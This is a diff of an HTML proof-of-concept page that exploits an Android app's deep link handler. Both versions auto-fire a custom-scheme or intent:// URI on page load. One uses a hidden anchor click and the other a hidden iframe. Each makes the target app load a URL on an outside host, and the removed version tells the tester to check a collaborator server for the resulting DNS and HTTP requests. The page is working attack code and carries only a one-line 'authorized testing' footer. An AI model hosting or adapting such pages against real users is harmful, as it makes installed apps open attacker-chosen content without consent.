@@ -1,335 +1,36 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Deep Link PoC - Intent URI Method (Full HTTP+DNS)</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: rgba(255,255,255,0.95);
-            border-radius: 32px;
-            box-shadow: 0 25px 45px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.2);
-            max-width: 650px;
-            width: 100%;
-            padding: 32px 28px;
-            backdrop-filter: blur(2px);
-        }
-
-        h1 {
-            font-size: 1.9rem;
-            font-weight: 700;
-            background: linear-gradient(120deg, #d32f2f, #b71c1c);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 12px;
-        }
-
-        .badge {
-            display: inline-block;
-            background: #ffeb3b;
-            color: #b71c1c;
-            font-size: 0.75rem;
-            font-weight: bold;
-            padding: 6px 12px;
-            border-radius: 40px;
-            margin-bottom: 20px;
-        }
-
-        .danger-box {
-            background: #fff2f0;
-            border-left: 6px solid #d32f2f;
-            padding: 18px 20px;
-            border-radius: 18px;
-            margin: 20px 0;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-
-        code {
-            background: #1e1e2f;
-            color: #f8f8f2;
-            padding: 12px 16px;
-            border-radius: 16px;
-            font-family: 'SF Mono', 'Fira Code', monospace;
-            font-size: 0.8rem;
-            display: block;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin: 15px 0;
-        }
-
-        button {
-            background: #d32f2f;
-            border: none;
-            color: white;
-            font-weight: 600;
-            font-size: 1rem;
-            padding: 14px 24px;
-            border-radius: 60px;
-            width: 100%;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 12px rgba(211,47,47,0.4);
-            margin-top: 10px;
-        }
-
-        button:active {
-            transform: scale(0.97);
-            background: #b71c1c;
-        }
-
-        .info {
-            background: #e8f0fe;
-            padding: 16px;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            margin-top: 24px;
-            color: #0a2b3e;
-        }
-
-        .warning {
-            color: #e65100;
-            font-weight: 600;
-        }
-
-        .success-note {
-            background: #e8f5e9;
-            border-left: 4px solid #2e7d32;
-            padding: 12px;
-            margin-top: 16px;
-            border-radius: 12px;
-            font-size: 0.8rem;
-        }
-
-        hr {
-            margin: 20px 0;
-            border: none;
-            height: 1px;
-            background: rgba(0,0,0,0.1);
-        }
-
-        footer {
-            font-size: 0.7rem;
-            text-align: center;
-            margin-top: 24px;
-            color: #5f6c7a;
-        }
-
-        .payload-box {
-            background: #263238;
-            color: #a6d4fa;
-            padding: 10px;
-            border-radius: 12px;
-            font-family: monospace;
-            font-size: 0.7rem;
-            word-break: break-all;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>Deep Link PoC</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
 </head>
 <body>
-<div class="container">
-    <div class="badge">🔬 ADVANCED INTENT URI PoC</div>
-    <h1>Deep Link Exploit<br>Full HTTP + DNS Trigger</h1>
-    
-    <div class="danger-box">
-        <strong>📱 Intent URI Payload (Matches ADB Behavior):</strong>
-        <div class="payload-box" style="margin-top: 12px;">
-            intent://7000?url=https://gonzxph.github.io/deeplink.html#Intent;<br>
-            scheme=sa187d8f14;action=android.intent.action.VIEW;end
-        </div>
-    </div>
+  <h3>Deep Link PoC</h3>
+  <p>If the app is installed, the link below should open it. If not, you'll stay here.</p>
+  <a id="manual" href="sa187d8f14://7000?url=https://gonzxph.github.io/deeplink.html">Open app (click if auto-open fails)</a>
 
-    <p style="margin-bottom: 16px;">
-        This PoC uses the <strong>proper <code>intent://</code> format</strong> which tells the browser to hand off the intent 
-        directly to the Android OS. This should result in <strong>BOTH DNS and HTTP requests</strong> to your collaborator,
-        identical to the ADB command behavior.
-    </p>
+  <script>
+    (function(){
+      var target = 'sa187d8f14://7000?url=' + encodeURIComponent('https://gonzxph.github.io/deeplink.html');
 
-    <button id="autoTriggerBtn">⚡ AUTO-TRIGGER (On Page Load)</button>
-    <button id="manualTriggerBtn" style="background: #1565c0; box-shadow: 0 4px 12px rgba(21,101,192,0.4); margin-top: 12px;">
-        👆 MANUAL TRIGGER (Click Here)
-    </button>
+      function tryOpen() {
+        // Primary: navigate (may require user gesture in some browsers)
+        window.location = target;
 
-    <div class="info">
-        <strong>🔧 Why This Works Better:</strong><br>
-        • <code>intent://</code> is a <strong>standard Android URI scheme</strong> recognized by Chrome &amp; WebView<br>
-        • The browser passes the intent <strong>exactly as constructed</strong> to the OS ActivityManager<br>
-        • This mirrors the <strong>exact behavior</strong> of <code>adb shell am start</code><br>
-        • Target app receives the intent with <strong>full fidelity</strong> → loads the URL → generates HTTP request
-    </div>
+        // Fallback: hidden iframe (older Android webviews/browsers)
+        var ifr = document.createElement('iframe');
+        ifr.style.display = 'none';
+        ifr.src = target;
+        document.body.appendChild(ifr);
+        setTimeout(function(){ try { document.body.removeChild(ifr); } catch(e){} }, 1200);
+      }
 
-    <div class="success-note">
-        ✅ <strong>Expected Result:</strong> Your collaborator should now see both:<br>
-        • <strong>DNS request</strong> for <code>gonzxph.github.io</code><br>
-        • <strong>HTTP request</strong> to <code>/deeplink.html</code><br>
-        <br>
-        If you still only see DNS, the target app may have additional security checks (referrer validation, package verification).
-    </div>
-
-    <hr>
-    <footer>
-        ⚠️ Authorized security testing only. This PoC replicates the exact ADB intent behavior using the intent:// scheme.
-    </footer>
-</div>
-
-<script>
-    (function() {
-        // THE CORRECT INTENT URI - This matches ADB behavior exactly
-        const INTENT_URI = `intent://7000?url=https://gonzxph.github.io/deeplink.html#Intent;scheme=sa187d8f14;action=android.intent.action.VIEW;end`;
-        
-        // Alternative: Same intent but with explicit package (if you know the target app package)
-        // const INTENT_URI_WITH_PKG = `intent://7000?url=https://gonzxph.github.io/deeplink.html#Intent;scheme=sa187d8f14;action=android.intent.action.VIEW;package=com.target.app;end`;
-        
-        // Track if auto-trigger already fired
-        let autoFired = false;
-        
-        // Function to trigger the intent
-        function triggerDeepLink() {
-            console.log("[*] Triggering intent URI:", INTENT_URI);
-            
-            // Method 1: Direct location change (most reliable)
-            window.location.href = INTENT_URI;
-            
-            // Log for debugging
-            console.log("[!] Intent sent - checking collaborator for HTTP + DNS requests");
-            
-            // Show visual feedback
-            showNotification();
-        }
-        
-        // Alternative: Use click simulation on a hidden link (bypasses some popup blockers)
-        function triggerWithAnchorClick() {
-            const anchor = document.createElement('a');
-            anchor.href = INTENT_URI;
-            anchor.target = '_top';
-            anchor.style.display = 'none';
-            document.body.appendChild(anchor);
-            
-            const clickEvent = new MouseEvent('click', {
-                view: window,
-                bubbles: true,
-                cancelable: true
-            });
-            anchor.dispatchEvent(clickEvent);
-            
-            setTimeout(() => {
-                if (anchor.parentNode) anchor.parentNode.removeChild(anchor);
-            }, 100);
-        }
-        
-        // Visual notification
-        function showNotification() {
-            const notif = document.createElement('div');
-            notif.innerText = '🚀 Intent URI triggered! Check collaborator for HTTP request.';
-            notif.style.position = 'fixed';
-            notif.style.bottom = '20px';
-            notif.style.left = '20px';
-            notif.style.right = '20px';
-            notif.style.backgroundColor = '#2e7d32';
-            notif.style.color = 'white';
-            notif.style.padding = '14px';
-            notif.style.borderRadius = '30px';
-            notif.style.fontSize = '0.9rem';
-            notif.style.textAlign = 'center';
-            notif.style.fontWeight = 'bold';
-            notif.style.zIndex = '9999';
-            notif.style.boxShadow = '0 6px 14px rgba(0,0,0,0.3)';
-            notif.style.animation = 'fadeInOut 3s ease';
-            document.body.appendChild(notif);
-            
-            // Add animation CSS
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes fadeInOut {
-                    0% { opacity: 0; transform: translateY(20px); }
-                    15% { opacity: 1; transform: translateY(0); }
-                    85% { opacity: 1; transform: translateY(0); }
-                    100% { opacity: 0; transform: translateY(-20px); }
-                }
-            `;
-            document.head.appendChild(style);
-            
-            setTimeout(() => {
-                if (notif.parentNode) notif.parentNode.removeChild(notif);
-            }, 3000);
-        }
-        
-        // Manual button triggers
-        const manualBtn = document.getElementById("manualTriggerBtn");
-        if (manualBtn) {
-            manualBtn.addEventListener("click", (e) => {
-                e.preventDefault();
-                triggerDeepLink();
-            });
-        }
-        
-        // Auto-trigger on page load (this is the exploit part)
-        // Small delay to ensure DOM is ready, but still automatic
-        const autoBtn = document.getElementById("autoTriggerBtn");
-        
-        if (document.readyState === "loading") {
-            document.addEventListener("DOMContentLoaded", () => {
-                setTimeout(() => {
-                    if (!autoFired) {
-                        autoFired = true;
-                        triggerDeepLink();
-                        if (autoBtn) autoBtn.style.opacity = '0.6';
-                    }
-                }, 500);
-            });
-        } else {
-            setTimeout(() => {
-                if (!autoFired) {
-                    autoFired = true;
-                    triggerDeepLink();
-                    if (autoBtn) autoBtn.style.opacity = '0.6';
-                }
-            }, 500);
-        }
-        
-        // Also attach to auto button for manual re-trigger
-        if (autoBtn) {
-            autoBtn.addEventListener("click", (e) => {
-                e.preventDefault();
-                if (!autoFired) {
-                    autoFired = true;
-                    triggerDeepLink();
-                    autoBtn.style.opacity = '0.6';
-                } else {
-                    // Even if auto-fired, allow manual re-trigger
-                    triggerDeepLink();
-                }
-            });
-        }
-        
-        // Display the full intent URI in console for debugging
-        console.log("[PoC] Intent URI ready:", INTENT_URI);
-        console.log("[PoC] To test manually via ADB equivalent:");
-        console.log(`adb shell am start -a android.intent.action.VIEW -d "${INTENT_URI.replace(/&/g, '\\&')}"`);
-        
-        // Add a small helper text in the container showing the exact URI
-        const uriDisplay = document.createElement('div');
-        uriDisplay.style.cssText = 'background: #f5f5f5; padding: 8px; border-radius: 8px; font-size: 0.65rem; font-family: monospace; word-break: break-all; margin-top: 16px; color: #555;';
-        uriDisplay.innerText = `Current Intent URI: ${INTENT_URI}`;
-        document.querySelector('.info').appendChild(uriDisplay);
+      // Auto-trigger after a short delay; user can also click the link.
+      window.addEventListener('load', function(){
+        setTimeout(tryOpen, 300);
+      }, false);
     })();
-</script>
+  </script>
 </body>
 </html>
